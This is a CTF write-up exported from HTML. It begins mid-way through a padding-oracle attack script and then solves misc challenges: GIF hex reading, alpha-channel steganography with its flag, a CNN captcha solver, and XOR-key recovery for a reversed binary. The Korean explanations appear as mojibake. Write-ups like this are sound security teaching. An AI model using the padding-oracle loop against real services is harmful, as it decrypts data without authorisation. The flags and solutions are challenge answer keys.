	print (&amp;quot;bytes([i]): &amp;quot;, bytes([i]))
	for j in range(0,0xff+1):
		print (&amp;quot;j: &amp;quot;,j)
		target = start + bytes([j]) + xor(inter[::-1], bytes([i]))
		res = send_payload(s, target, enc)
		print(&amp;quot;target: &amp;quot;, hex_view(target), &amp;quot;=&amp;gt;&amp;quot;, target)
		#print(hex_view(enc), &amp;quot;=&amp;gt;&amp;quot;, enc)
		#print(res)
		if &amp;#x27;Invalid padding.&amp;#x27; not in res:
			print(res)
			break
	inter += bytes([i ^ j])
	print(&amp;quot;inter: &amp;quot;, hex_view(inter[::-1]))
	print(&amp;quot;inter: &amp;quot;, hex_view(inter[::-1]))

# inter xor iv =&amp;gt; plain
inter = inter[::-1]
plain = xor(inter, iv)
print(&amp;quot;plain =&amp;gt;&amp;quot;, plain)&lt;/code&gt;&lt;/pre&gt;&lt;figure id=&quot;b2a17075-fd82-4d39-a304-000371d0ab20&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob990.png&quot;&gt;&lt;img style=&quot;width:981px&quot; src=&quot;/assets/bob/bob990.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure id=&quot;496d3534-67fb-425e-8afd-ef8dd0b3f164&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob991.png&quot;&gt;&lt;img style=&quot;width:952px&quot; src=&quot;/assets/bob/bob991.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;h1 id=&quot;5eb646bd-e9cf-4e9f-b8b7-41585ddbb233&quot; class=&quot;&quot;&gt;ğŸ–¥ï¸ MISC&lt;/h1&gt;&lt;h2 id=&quot;1076afd7-b43e-403e-b644-abf839bee2ab&quot; class=&quot;&quot;&gt;&amp;#x27;gif&amp;#x27;t&lt;/h2&gt;&lt;hr id=&quot;cccac227-7d55-4036-8efc-c761ea3d0e98&quot;/&gt;&lt;p id=&quot;c58ba904-1b16-4f9d-a03b-20f8736268f9&quot; class=&quot;&quot;&gt;ë¬¸ì œì— ëŒ€í•œ ê°„ë‹¨ ì„¤ëª…&lt;/p&gt;&lt;figure id=&quot;f194f3a3-ce61-4028-bdb2-23d713059c81&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob992.png&quot;&gt;&lt;img style=&quot;width:791px&quot; src=&quot;/assets/bob/bob992.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;633fa1e2-ab01-4d9f-a602-46d42418dc56&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;easy gif misc&lt;/div&gt;&lt;/figure&gt;&lt;ul id=&quot;db22f766-18bf-44b2-aff7-58cf28b0e978&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë¬¸ì œì˜ ê·¸ë¦¼ì—ì„œ gif ê·¸ë¦¼ì„ ë³´ë©´ ë°˜ì§ì´ëŠ” ê¸€ìê°€ ë‘ ìœ„ì¹˜ì—ì„œ ë°˜ì§ì´ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤. ì´ ê·¸ë¦¼ì´ ë¬¸ì œ íŒŒì¼ì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;8a9b1183-a0c6-4fff-b62f-c72af6364842&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob993.png&quot;&gt;&lt;img style=&quot;width:963px&quot; src=&quot;/assets/bob/bob993.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;c10871b4-f810-467c-a7c6-b239eb5ca8c7&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ gif íŒŒì¼ì„ ë³´ë©´ 16ì§„ìˆ˜ë¡œ ë‘ ê°œì˜ ê¸€ìê°€ ì™”ë‹¤ê°”ë‹¤ í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;809d0c82-1514-4c58-b330-b24b29802716&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í’€ì´í•˜ëŠ” ë°©ë²•ì€ ë‹¤ì–‘í•˜ê²Œ ìˆì„ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— í•˜ë‚˜í•˜ë‚˜ ì„¤ëª…í•˜ì§€ ì•Šê³ , íŒŒì¼ ë‚´ë¶€ì˜ gif êµ¬ì„±ì„ ë³´ì—¬ì£¼ë„ë¡ í•˜ê² ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;71588847-f904-48c3-a9b0-2cef2fd33190&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob994.png&quot;&gt;&lt;img style=&quot;width:670px&quot; src=&quot;/assets/bob/bob994.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;7157d1d8-49aa-40ff-ab55-1ca417de133f&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ì™€ ê°™ì´ ì´ë¯¸ì§€ë¥¼ ë³¼ ìˆ˜ ìˆëŠ”ë°, ì´ë¥¼ ì­ˆìš± ë”°ë¼ ì‘ì„±í•˜ì—¬ 16ì§„ìˆ˜ë¥¼ asciië¡œ ë³€í™˜í•˜ê²Œ ë˜ë©´ flagë¥¼ ì–»ì„ ìˆ˜ ìˆëŠ” ê°„ë‹¨í•œ ë¬¸ì œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;a097b079-1134-46fc-901a-a59b50301da2&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;c6916655-7d89-4730-b76b-b240cf9895b2&quot; class=&quot;&quot;&gt;Hide And Seek&lt;/h2&gt;&lt;hr id=&quot;339c151e-52c6-4374-81d9-88e5ffef69c1&quot;/&gt;&lt;figure id=&quot;0a5205b6-b20d-46bc-a118-907a98e3fed8&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob995.png&quot;&gt;&lt;img style=&quot;width:336px&quot; src=&quot;/assets/bob/bob995.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;7404e1a3-5544-43e2-9972-e3039b699200&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;ì´ ë¬¸ì œì—ì„œëŠ” stego.png íŒŒì¼ì´ ì£¼ì–´ì§„ë‹¤. ì£¼ì–´ì§„ íŒŒì¼ì˜ ì´ë¦„ì— ë‚˜íƒ€ë‚˜ë“¯ Stegography ë¬¸ì œì˜ ì¼ì¢…ìœ¼ë¡œ íŒŒì•…í•  ìˆ˜ ìˆë‹¤.
ë¬¸ì œì˜ ì´ë¯¸ì§€ë¥¼ ì˜ ë³´ë©´ ì•„ë˜ ê²€ì€ìƒ‰ ì˜ì—­ì— ì´ˆë¡ìƒ‰ ì ë“¤ì´ ì¼ë¶€ ë‚˜íƒ€ë‚˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ ë¬¸ì œëŠ” ì´ë¯¸ì§€ì˜ PIXELì„ êµ¬ì„±í•˜ëŠ” êµ¬ë¶„ ê°’ R,G,B,A ì¤‘ A ê°’(íˆ¬ëª…ë„)ì„ í™œìš©í•˜ì—¬ Flagë¥¼ ì¶”ì¶œí•˜ëŠ” ë¬¸ì œë‹¤. &lt;/div&gt;&lt;/figure&gt;&lt;ul id=&quot;64237d9a-184f-40d6-a4df-73fc503af2ec&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì£¼ì–´ì§„ ì´ë¯¸ì§€ì—ì„œ Aê°’(íˆ¬ëª…ë„)ê°€ 0xFFê°€ ì•„ë‹Œ ì¢Œí‘œë“¤ê³¼ ê·¸ ì¢Œí‘œì— í•´ë‹¹í•˜ëŠ” Pixelì˜ R,G,B,A ê°’ë“¤ì„ ì¶”ì¶œí•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;7b252db9-c852-40c8-8e54-cbc497104d3f&quot; class=&quot;code&quot;&gt;&lt;code&gt;(x,y) =&amp;gt; (r,g,b,a)
===============================
(1,416)	=&amp;gt; (13,110,20,170)	=&amp;gt; &amp;#x27;n&amp;#x27;
(32,1172)	=&amp;gt; (0,103,0,167)	=&amp;gt; &amp;#x27;g&amp;#x27;
(45,967)	=&amp;gt; (15,105,24,163)	=&amp;gt; &amp;#x27;i&amp;#x27;
(113,1004)	=&amp;gt; (17,71,28,172)	=&amp;gt; &amp;#x27;G&amp;#x27;
(160,1010)	=&amp;gt; (17,66,26,174)	=&amp;gt; &amp;#x27;B&amp;#x27;
(161,704)	=&amp;gt; (16,116,25,176)	=&amp;gt; &amp;#x27;t&amp;#x27;
(192,110)	=&amp;gt; (17,70,35,154)	=&amp;gt; &amp;#x27;F&amp;#x27;
(289,983)	=&amp;gt; (17,98,28,152)	=&amp;gt; &amp;#x27;b&amp;#x27;
(301,736)	=&amp;gt; (17,95,26,173)	=&amp;gt; &amp;#x27;_&amp;#x27;
(312,1265)	=&amp;gt; (0,103,0,157)	=&amp;gt; &amp;#x27;g&amp;#x27;
(359,887)	=&amp;gt; (17,64,27,156)	=&amp;gt; &amp;#x27;@&amp;#x27;
(395,600)	=&amp;gt; (202,95,163,161)	=&amp;gt; &amp;#x27;_&amp;#x27;
(415,45)	=&amp;gt; (18,105,36,175)	=&amp;gt; &amp;#x27;i&amp;#x27;
(445,1106)	=&amp;gt; (17,98,33,150)	=&amp;gt; &amp;#x27;b&amp;#x27;
(453,256)	=&amp;gt; (202,105,163,169)	=&amp;gt; &amp;#x27;i&amp;#x27;
(456,783)	=&amp;gt; (18,105,30,159)	=&amp;gt; &amp;#x27;i&amp;#x27;
(480,433)	=&amp;gt; (31,95,57,171)	=&amp;gt; &amp;#x27;_&amp;#x27;
(533,833)	=&amp;gt; (20,110,34,166)	=&amp;gt; &amp;#x27;n&amp;#x27;
(557,90)	=&amp;gt; (25,95,44,168)	=&amp;gt; &amp;#x27;_&amp;#x27;
(643,1106)	=&amp;gt; (17,111,33,151)	=&amp;gt; &amp;#x27;o&amp;#x27;
(668,818)	=&amp;gt; (17,123,27,153)	=&amp;gt; &amp;#x27;{&amp;#x27;
(674,677)	=&amp;gt; (30,105,34,165)	=&amp;gt; &amp;#x27;i&amp;#x27;
(686,55)	=&amp;gt; (18,100,36,164)	=&amp;gt; &amp;#x27;d&amp;#x27;
(801,54)	=&amp;gt; (17,108,35,155)	=&amp;gt; &amp;#x27;l&amp;#x27;
(917,292)	=&amp;gt; (18,36,35,177)	=&amp;gt; &amp;#x27;$&amp;#x27;
(968,574)	=&amp;gt; (15,72,25,162)	=&amp;gt; &amp;#x27;H&amp;#x27;
(970,1039)	=&amp;gt; (0,125,0,178)	=&amp;gt; &amp;#x27;}&amp;#x27;
(972,801)	=&amp;gt; (17,95,29,158)	=&amp;gt; &amp;#x27;_&amp;#x27;
(987,922)	=&amp;gt; (17,115,26,160)	=&amp;gt; &amp;#x27;s&amp;#x27;&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;58b4f7f3-6307-45e1-a500-bdcae00546a6&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ ê°’ë“¤ì—ì„œ ì¤‘ìš”í•œ ê°’ë“¤ì€ Gì— í•´ë‹¹í•˜ëŠ” ê°’ë“¤ê³¼ Aì— í•´ë‹¹í•˜ëŠ” ê°’ë“¤ì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;fca88a9a-5ee5-46ca-8b7f-455d01932f8c&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;GëŠ” Flagì˜ ê° ë¬¸ìë“¤ì„ ì˜ë¯¸í•˜ë©°, AëŠ” ë¬¸ìë“¤ì˜ Indexë¥¼ ì˜ë¯¸í•œë‹¤. &lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;f94dc22d-4a99-4c9a-a32c-f6be7d2c832a&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;G ê°’ë“¤ì„ Aì˜ ê°’ì— ë”°ë¼ ë‚˜ì—´í•˜ë©´ Flagë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;41aa10a9-7754-4ca6-8122-9a21db079057&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;strong&gt;Flag : bob{Fl@g_is_Hiding_in_G_Bit$}&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;c4afb7fe-867b-4024-9abb-5f44be507c1d&quot; class=&quot;&quot;&gt;Catcha&lt;/h2&gt;&lt;hr id=&quot;b7a4a66f-b5e2-4aef-a11e-8c9e7b1ed540&quot;/&gt;&lt;figure id=&quot;6282942e-dd30-4f10-9f0b-7394b3054c51&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob996.png&quot;&gt;&lt;img style=&quot;width:713px&quot; src=&quot;/assets/bob/bob996.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;e3849c43-27da-4abf-af36-1815826af47c&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;ì•½ 5ë§Œì¥ì˜ ê°•ì•„ì§€ì™€ ê³ ì–‘ì´ ì‚¬ì§„ì´ ëœë¤ìœ¼ë¡œ ë‚˜ì˜¤ë©°, 1ì´ˆ ì•ˆì— ì‚¬ì§„ì— ë‚˜ì˜¨ ë™ë¬¼ì´ ê°•ì•„ì§€ì¸ì§€ ê³ ì–‘ì´ì¸ì§€ ë§ì¶°ì•¼ í•˜ëŠ” captcha solver ë¬¸ì œì…ë‹ˆë‹¤. 300ê°œì˜ ìŠ¤í…Œì´ì§€ë¥¼ ëª¨ë‘ í´ë¦¬ì–´í•˜ë©´ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.&lt;/div&gt;&lt;/figure&gt;&lt;p id=&quot;76cca7a8-4d79-4f9f-abba-7cb5b2146130&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;622a4e31-c88d-403d-aa67-827e0bd76251&quot; class=&quot;&quot;&gt;ì¶œì œ ì˜ë„ëŠ” ì¼ì¢…ì˜ &amp;#x27;&lt;code&gt;ìë™ ì˜ì‚¬ ê²°ì •ê¸°&lt;/code&gt;&amp;#x27;ë¥¼ ë§Œë“¤ ìˆ˜ ìˆëŠ”ê°€?&amp;#x27; ì´ë‹¤.&lt;/p&gt;&lt;p id=&quot;c0d40164-8783-4c86-97a9-148c996e641b&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;5d5a22e7-53bd-41db-81c1-0153d5e48c55&quot; class=&quot;&quot;&gt;ì˜ë„í–ˆë˜ í’€ì´ëŠ” ì‚¬ì‹¤ &lt;code&gt;CNNê³¼ GANì„ ì ì ˆíˆ ì„ì–´ í•˜ë‚˜ì˜ ì•™ìƒë¸” ëª¨ë¸ì„ ì»´íŒŒì¼í•˜ê³  ì£¼ì–´ì§„ ë°ì´í„°ì…‹ìœ¼ë¡œ í•™ìŠµ í›„ ì •ë‹µì„ ì˜ˆì¸¡&lt;/code&gt;í•˜ëŠ” ê²ƒì´ì˜€ìœ¼ë‚˜,  ë¬¸ì œì˜ ë‚œì´ë„ë¥¼ í•˜í–¥ ì¡°ì ˆ í•˜ë‹¤ ë³´ë‹ˆ(...) ë¬¸ì œì— ì œê³µë˜ëŠ” ë°ì´í„°ì…‹ì„ ì „ë¶€ ì œê³µí•˜ê²Œ ë˜ì—ˆê³ , ê·¸ë¡œ ì¸í•´ ë”°ë¡œ ëª¨ë¸ì„ ì»´íŒŒì¼í•˜ì§€ ì•Šê³  ì£¼ì–´ì§„ ë°ì´í„°ì…‹ìœ¼ë¡œ ì¼ì¢…ì˜ hash tableì„ ë§Œë“¤ì–´ ë¬¸ì œë¥¼ í’€ì´í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;&lt;p id=&quot;00fa7675-be8f-4a98-b51c-3b4a8121d57d&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;daf77e06-1d50-4b5e-8c5a-cef4ed965706&quot; class=&quot;&quot;&gt;ë¨¸ì‹ ëŸ¬ë‹ìœ¼ë¡œ í’€ê¸°&lt;/h2&gt;&lt;p id=&quot;05dd920f-9145-462b-9ca1-142f26f4f87e&quot; class=&quot;&quot;&gt;ë¶„ë¥˜í•´ì•¼ í•  ë°ì´í„°ê°€ ì´ë¯¸ì§€ì´ê¸° ë•Œë¬¸ì— &lt;code&gt;CNN(Convolutional Neural Network) ëª¨ë¸&lt;/code&gt;ì„ ì‚¬ìš©í•œë‹¤. ì£¼ì–´ì§„ ë°ì´í„°ì…‹ì˜ ì´ë¯¸ì§€ ì‚¬ì´ì¦ˆê°€ ëª¨ë‘ ì œê°ê°ì´ê¸° ë•Œë¬¸ì— ì–´ëŠì •ë„ì˜ preprocessingÂ ì´ í•„ìš”í•˜ë‹¤. ë˜í•œ í›ˆë ¨ì˜ ì—°ì‚°ëŸ‰ì„ ì¤„ì—¬ í›ˆë ¨ íš¨ìœ¨ì„ ë†’ì´ê¸° ìœ„í•´ ì´ë¯¸ì§€ë¥¼ grayscaleë¡œ ë³€í™˜í–ˆë‹¤.&lt;/p&gt;&lt;ol id=&quot;639f4773-d625-49e9-b3c1-71e39480393f&quot; class=&quot;numbered-list&quot; start=&quot;1&quot;&gt;&lt;li&gt;ì´ë¯¸ì§€ ì „ì²˜ë¦¬ (Preprocessing)&lt;pre id=&quot;2ed1dc60-ca73-499a-a5a1-5ef1dec3f00d&quot; class=&quot;code&quot;&gt;&lt;code&gt;import numpy as np
import pandas as pd
import cv2
import tensorflow as tf
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Flatten, Dropout, Activation, Conv2D, MaxPooling2D

path = &amp;#x27;./dataset/train&amp;#x27;

X = []
y = [] # target
convert = lambda category : int(category == &amp;#x27;dog&amp;#x27;)

def preprocess(path):
    for p in os.listdir(path):
        category = p.split(&amp;quot;.&amp;quot;)[0]
        category = convert(category)
        img_array = cv2.imread(os.path.join(path,p),cv2.IMREAD_GRAYSCALE)
        new_img_array = cv2.resize(img_array, dsize=(80, 80))
        X.append(new_img_array)
        y.append(category)

# preprocess the data
preprocess(path)
X = np.array(X).reshape(-1, 80,80,1)
y = np.array(y)

# normalize data
X = X/255.0&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;7e73d043-64b8-4da1-a3d2-1b484a4af2c1&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;2ea7f0b2-0046-4e28-80db-27b33ddcf2a1&quot; class=&quot;numbered-list&quot; start=&quot;2&quot;&gt;&lt;li&gt;ëª¨ë¸ ë¹Œë“œ ë° ì»´íŒŒì¼&lt;pre id=&quot;8834b848-0042-4655-a31e-85ef8952ffc9&quot; class=&quot;code&quot;&gt;&lt;code&gt;model = Sequential()

# add a densely-connected layer with 64 units to the model:
model.add(Conv2D(64,(3,3), activation = &amp;#x27;relu&amp;#x27;, input_shape = X.shape[1:]))
model.add(MaxPooling2D(pool_size = (2,2)))

# add another layer:
model.add(Conv2D(64,(3,3), activation = &amp;#x27;relu&amp;#x27;))
model.add(MaxPooling2D(pool_size = (2,2)))

model.add(Flatten())
model.add(Dense(64, activation=&amp;#x27;relu&amp;#x27;))

# add a softmax layer with 10 output units:
model.add(Dense(1, activation=&amp;#x27;sigmoid&amp;#x27;))

model.compile(optimizer=&amp;quot;adam&amp;quot;,
              loss=&amp;#x27;binary_crossentropy&amp;#x27;,
              metrics=[&amp;#x27;accuracy&amp;#x27;])&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;b4587687-3ba9-474e-83f8-ae700c7051c3&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;21f0aa88-fbcf-4a6f-b8f4-7100eb7c8426&quot; class=&quot;numbered-list&quot; start=&quot;3&quot;&gt;&lt;li&gt;ëª¨ë¸ í•™ìŠµ&lt;pre id=&quot;46b4a711-dadf-4cc8-b405-2680d74a1052&quot; class=&quot;code&quot;&gt;&lt;code&gt;model.fit(X, y, epochs=10, batch_size=32, validation_split=0.2)&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;cdf0e7e4-fb08-466e-9137-030d094c9b08&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;091db5c7-972d-4954-9fe2-d8c1428b406f&quot; class=&quot;numbered-list&quot; start=&quot;4&quot;&gt;&lt;li&gt;ì´ë¯¸ì§€ ì˜ˆì¸¡&lt;pre id=&quot;586605de-414d-4f46-a9df-47dd05728d01&quot; class=&quot;code&quot;&gt;&lt;code&gt;cv2.imread(path, cv2.IMREAD_GRAYSCALE)
# resize
cv2.resize(img_array, dsize=(80,80))
# reshape
data = np.array(data).reshape(-1,80,80,1)
# normalize
data = data/255.0

# predict
model.predict(data)&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;5d5544c3-51b2-4ec5-8f93-043f81b21d42&quot; class=&quot;&quot;&gt;ì´í›„, í•™ìŠµí•œ ëª¨ë¸ì„ ì´ìš©í•´ ë¬¸ì œ ì´ë¯¸ì§€ë¥¼ ì‹¤ì‹œê°„ìœ¼ë¡œ ë°›ì•„ì˜¤ê³  ë¬¸ì œì˜ ì •ë‹µì„ ì˜ˆì¸¡í•œ ë’¤ ì •ë‹µì„ ì„œë²„ë¡œ ì „ì†¡í•˜ë©´ ëœë‹¤.&lt;/p&gt;&lt;p id=&quot;70593af3-466e-4355-a234-fa675abc0133&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 id=&quot;f018c9e6-ac98-4716-a40b-c943cf30c7bd&quot; class=&quot;&quot;&gt;hashtableë¡œ í’€ê¸°&lt;/h3&gt;&lt;p id=&quot;e205869b-50f8-458a-ad62-3c0e559f9848&quot; class=&quot;&quot;&gt;ì†ŒìŠ¤ì½”ë“œì— ë‚˜ì™€ìˆëŠ” kaggle competitionì— ì ‘ì†í•˜ì—¬ ì£¼ì–´ì§„ ë°ì´í„°ì…‹ì„ ëª¨ë‘ ë‹¤ìš´ë¡œë“œ ë°›ì€ ë‹¤ìŒ hash table ì„ ì œì‘í•œë‹¤. ì´í›„ ë¬¸ì œ ì´ë¯¸ì§€ì— í•´ë‹¹í•˜ëŠ” hashë¥¼ ì´ìš©í•˜ì—¬ ë¬¸ì œì˜ ì •ë‹µì„ êµ¬í•œë‹¤.&lt;/p&gt;&lt;p id=&quot;a9fb28b6-1ae7-4acc-ac43-c54c86319ccd&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;1fe1f3a4-e0b5-4320-9ecb-7d51c06993af&quot; class=&quot;&quot;&gt;verrox&lt;/h2&gt;&lt;hr id=&quot;d17def0e-bdf7-4381-bacc-e09c7bfd9b53&quot;/&gt;&lt;figure id=&quot;8e8cd0a7-a3a9-4cbc-b8f4-507a2a867fd3&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob997.png&quot;&gt;&lt;img style=&quot;width:791px&quot; src=&quot;/assets/bob/bob997.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;dc998500-7be1-4a01-a3ad-30a3a97302db&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;descriptionì„ ì‚´í´ë³´ë©´ ì„¸ìƒì´ ë’¤ì§‘ì–´ì§„ ê²ƒ ê°™ë‹¤ëŠ” ë§ì„ í•˜ê³  ìˆë‹¤.
verroxë¥¼ ë’¤ì§‘ìœ¼ë©´ xorrevì´ë©°, xor + revë¼ëŠ” ê²ƒì„ ìœ ì¶”í•  ìˆ˜ ìˆë‹¤.
í•´ë‹¹ ë°”ì´ë„ˆë¦¬ë¥¼ reverseí•œ í›„ 8ë°”ì´íŠ¸ xor í‚¤ë¥¼ êµ¬í•´ ì—°ì‚°í•˜ë©´ ì›ë³¸ ELF íŒŒì¼ì´ ë‚˜ì˜¤ê²Œ ë˜ë©°, ì‹¤í–‰ ì‹œ í”Œë˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.&lt;/div&gt;&lt;/figure&gt;&lt;p id=&quot;8bb3dd52-9db4-44c4-9b94-fabd6253c635&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;5fbd0d2c-6460-4c55-9b90-1489b3d0a8da&quot; class=&quot;&quot;&gt;1. xor key&lt;/h3&gt;&lt;figure id=&quot;8025021a-c47e-4554-9f31-dfc39e3ebfd5&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob998.png&quot;&gt;&lt;img style=&quot;width:603px&quot; src=&quot;/assets/bob/bob998.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;9a448c2e-db5a-453e-ba16-d3f477f9ef7c&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë°”ì´ë„ˆë¦¬ë¥¼ hexdump, hxd ë“±ìœ¼ë¡œ ì‚´í´ë³´ë©´ 0x231f33f2aa2d7ed2ê°€ ìƒë‹¹íˆ ë§ì´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;763be2a4-2f53-478d-bf28-cb4d21f8505a&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;8ë°”ì´íŠ¸ ë‹¨ìœ„ë¡œ 0x231f...ê°€ ë°˜ë³µë˜ê³  ìˆê¸° ë•Œë¬¸ì— 8ë°”ì´íŠ¸ ë‹¨ìœ„ë¡œ xor ì—°ì‚°ì„ í–ˆë‹¤ê³  ë³¼ ìˆ˜ ìˆë‹¤. ë˜í•œ, elf ë°”ì´ë„ˆë¦¬ì˜ ê²½ìš° null byteì˜ ë°˜ë³µì´ ë§ê¸° ë•Œë¬¸ì— xor keyëŠ” 0x231f33f2aa2d7ed2ë¡œ ê°€ì •í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;c8b6f7bf-5dca-4b8f-be43-943ac8f62979&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;81e3ea12-9393-4fd0-8bc7-d55f08fe74d7&quot; class=&quot;&quot;&gt;2. í’€ì´&lt;/h3&gt;&lt;pre id=&quot;6a66799c-a54f-4ac5-a9d6-da0f9e02a62e&quot; class=&quot;code&quot;&gt;&lt;code&gt;#coding: utf-8

import struct


data = b&amp;#x27;&amp;#x27;
with open(&amp;quot;verrox&amp;quot;, &amp;quot;rb&amp;quot;) as f:
    data = f.read()

with open(&amp;quot;xorrev&amp;quot;, &amp;quot;wb&amp;quot;) as f:
    key = b&amp;quot;\x23\x1f\x33\xf2\xaa\x2d\x7e\xd2&amp;quot;
    res = b&amp;quot;&amp;quot;
    for i in range(0, len(data)):
        res += struct.pack(&amp;quot;B&amp;quot;, data[i]^key[i%8])

    res = res[::-1]
    f.write(res)&lt;/code&gt;&lt;/pre&gt;&lt;figure id=&quot;63918d1b-1f80-44c4-9d0c-466fd6d28865&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob999.png&quot;&gt;&lt;img style=&quot;width:976px&quot; src=&quot;/assets/bob/bob999.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;a44f2d01-018c-49e1-be95-441e98c26f39&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•´ë‹¹ xor keyë¥¼ ì´ìš©í•˜ì—¬ 8ë°”ì´íŠ¸ ë‹¨ìœ„ë¡œ xorì—°ì‚° í›„ reverse í•´ì£¼ê²Œ ë˜ë©´ ì›ë³¸ ë°”ì´ë„ˆë¦¬ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;5bba1572-d03a-48d3-b9a3-ef0be5c96b7c&quot; class=&quot;&quot;&gt;
